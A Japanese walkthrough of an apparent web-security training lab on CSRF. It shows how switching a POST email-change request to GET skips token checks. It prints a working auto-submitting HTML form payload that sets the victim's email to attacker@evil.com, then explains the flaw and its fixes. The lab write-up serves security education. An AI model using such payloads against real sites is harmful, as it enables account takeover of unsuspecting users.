
---

## 【STEP 1】ログイン

1. Burp のブラウザでラボの URL を開く  
2. 右上の **My account** をクリック  
3. ログイン情報を入力：

```
Username: wiener
Password: peter
```

4. **Log in** をクリック

---

## 【STEP 2】メール変更リクエストをキャプチャ

1. ログイン後、メールアドレス変更フォームが見える  
2. Email に適当な値を入力（例: `test@test.com`）  
3. **Update email** をクリック

---

## 【STEP 3】Proxy 履歴を確認

1. Burp に戻り **Proxy → HTTP history** を開く  
2. リストから以下を探す：

```
POST /my-account/change-email
```

3. そのリクエストをクリック

---

## 【STEP 4】Repeater に送る

1. リクエスト上で右クリック  
2. **Send to Repeater**  
3. 上のタブから **Repeater** を開く

---

## 【STEP 5】CSRFトークンを変えて試す（確認作業）

1. Repeater 左側にリクエストが表示されている  
2. 下の方にある `csrf=xxxxxx` を適当に書き換える（例: `csrf=abc123`）  
3. **Send** をクリック  
4. Response に：

```
Invalid CSRF token
```

→ **POST はちゃんと CSRF 検証している** と確認できた ✅

---

## 【STEP 6】GETメソッドに変換する ← 核心ポイント

1. リクエスト上で右クリック  
2. **Change request method** をクリック  
3. リクエストが以下のように変わる：

```
GET /my-account/change-email?email=test@test.com HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

- `csrf=` が **消えている**ことを確認

4. **Send** をクリック  
5. Response が **200 OK（成功）**

→ **GET では CSRF トークン検証が行われていない** と判明！ ✅

---

## 【STEP 7】URL をコピーする

1. Repeater のリクエスト上で右クリック  
2. **Copy URL** をクリック  

コピーされる URL の例：

```
https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=test@test.com
```

---

## 【STEP 8】Exploit Server を開く

1. ラボのページに戻る  
2. 上部の **Go to exploit server** をクリック

---

## 【STEP 9】罠HTMLを作る

1. exploit server の **Body** を全部消す  
2. 以下の HTML を貼り付ける：

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@evil.com">
</form>
<script>
    document.forms[0].submit();
</script>
```

3. `action=` の URL を **さっきコピーした URL のベース部分に変更**  
   - `?email=...` は不要（form の value で指定するため）

4. `value="pwned@evil.com"` を **自分のアカウントとは違うメール** に変更  
   - 例: `attacker@evil.com`

---

## 【STEP 10】動作確認

1. **Store** をクリック  
2. **View exploit** をクリック  
3. 新しいタブが開き、自動で submit される  
4. Burp の **Proxy → HTTP history** を確認：

```
GET /my-account/change-email?email=attacker@evil.com
```

→ 罠ページからリクエストが飛んでいるのを確認できる ✅

---

## 【STEP 11】被害者に届ける

1. exploit server に戻る  
2. **Deliver to victim** をクリック  
3. ラボに **Congratulations!** が出たらクリア 🎉


---


## 1. **どーいう脆弱性？**

> **POST では CSRF トークンを検証しているのに、GET では検証していない “メソッド依存の CSRF 検証漏れ”**

サーバーが  
- **POST → CSRF 必須**  
- **GET → CSRF 不要**  
という不統一な実装になっており、攻撃者は **GET に変えるだけで CSRF を回避できる**。

---

## 2. **どう気づいた？（気づきのプロセス）**

Burp Repeater で以下を確認：

1. **POST /change-email**  
   → CSRF トークンを変えると **Invalid CSRF token**  
   → POST はちゃんと検証している

2. **Change request method → GET に変更**  
   → `csrf=` が消える  
   → **200 OK で成功してしまう**

ここで  
> 「あ、GET だけ CSRF チェックしてないやん」  
と気づく。

---

## 3. **どう攻撃した？（攻撃手順の本質）**

攻撃者は被害者に以下の罠ページを踏ませる：

```html
<form action="https://TARGET/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

被害者が開くと：

1. form が **GET** で自動送信  
2. Cookie が自動添付  
3. サーバーは GET の CSRF チェックをしていない  
4. **被害者のメールアドレスが攻撃者のものに書き換わる**

---

## 4. **どう対策する？（本質的な修正）**

### ✔ **GET でも POST でも同じ CSRF 検証を行う**  
メソッドに依存したバラバラの実装をやめる。

### ✔ **状態変更系は GET を許可しない**  
- GET は本来「参照専用」  
- 変更系は **POST / PUT / PATCH** のみに統一

### ✔ SameSite Cookie の適切な設定  
- `SameSite=Lax` or `Strict`  
- ただし根本対策にはならない（補助的）

---

